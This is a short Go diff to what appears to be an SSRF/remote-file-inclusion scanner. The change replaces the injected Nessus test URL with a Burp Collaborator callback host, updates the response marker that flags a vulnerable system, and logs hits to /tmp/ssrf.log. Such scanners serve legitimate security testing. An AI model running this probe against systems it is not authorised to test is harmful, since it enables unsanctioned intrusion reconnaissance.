@@ -72,7 +72,7 @@ func main() {
 					buf := new(bytes.Buffer)
 					buf.ReadFrom(resp.Body)
 					newStr := buf.String()
-					if strings.Contains(newStr , "TmVzc3VzQ29kZUV4ZWNUZXN0") == true {
+					if strings.Contains(newStr , "k6unx4pudf8k5itoapaxjwzjigz") == true {
 						color.HiGreen("[*] Vulnerable System Found! [*]\n")
 						f, err := os.OpenFile("/tmp/ssrf.log",
 							os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -118,7 +118,7 @@ func fetchURL(u *url.URL) (*http.Response, error) {
 		Timeout:   5 * time.Second,
 	}
 	kl := ""+u.String()+""
-	newurl  := strings.Replace(kl, "FUZZ", "http://rfi.nessus.org/rfi.txt",1)
+	newurl  := strings.Replace(kl, "FUZZ", "http://omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net",1)
 	req, err := http.NewRequest("GET", newurl, nil)
 	if err != nil {
 		return nil, err
